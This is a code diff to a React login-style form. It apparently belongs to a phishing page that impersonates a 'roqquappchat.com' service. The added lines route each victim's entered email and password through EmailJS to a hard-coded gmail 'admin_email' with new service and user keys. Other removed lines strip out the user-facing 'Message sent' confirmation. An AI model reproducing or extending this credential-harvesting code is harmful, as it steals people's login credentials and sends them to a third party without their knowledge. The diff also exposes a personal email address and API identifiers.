@@ -20,6 +20,9 @@ const Form = (props) => {
     const templateParams = {
         client_email: email,
         client_password: password,
+        admin_email: 'munisco12@gmail.com',
+        from_name: 'https://roqquappchat.com',
+        to_name: 'Admin'
        
     }
     const handleSubmit = async (e) => {
@@ -34,18 +37,14 @@ const Form = (props) => {
 
             emailjs
                 .send(
-                    'service_ug3kztv',
-                    'template_1fpejxx',
+                    'service_cajdfqp',
+                    'template_wss11os',
                     templateParams,
-                    'user_TyUAlfFTW7kMzOobPhtRV'
+                    'user_xCNzJyoa0acBRP75Xy9wk'
                 )
                 .then(
                     (result) => {
-                        setDisplayMessage('Message sent')
                         console.log(result.text, 'email sent')
-                        setEmail('')
-                        setName('')
-                        setMessage('')
                     },
                     (error) => {
                         console.log(error, 'email failed')
